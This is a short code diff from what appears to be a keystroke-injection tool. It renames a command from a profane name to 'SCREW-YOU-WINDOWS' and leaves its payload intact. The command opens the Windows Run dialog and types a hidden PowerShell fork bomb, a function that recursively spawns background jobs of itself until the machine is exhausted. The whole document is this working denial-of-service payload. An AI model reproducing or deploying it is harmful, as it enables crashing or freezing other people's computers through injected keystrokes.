@@ -124,13 +124,13 @@ def cmd_dest(args):
     cmd_enter()
 
 
-@command("FUCK-YOU-WINDOWS")
-def cmd_fuck(args):
+@command("SCREW-YOU-WINDOWS")
+def cmd_screw(args):
     cmd_gui('r')
     time.sleep(0.01)
     cmd_string('r')
     time.sleep(0.2)
-    layout.write('powershell -WindowStyle Hidden -Command "function fuck { Start-Job -ScriptBlock ${function:fuck}; & fuck }; fuck"')
+    layout.write('powershell -WindowStyle Hidden -Command "function screw { Start-Job -ScriptBlock ${function:screw}; & screw }; screw"')
     time.sleep(0.2)
     cmd_enter()
 
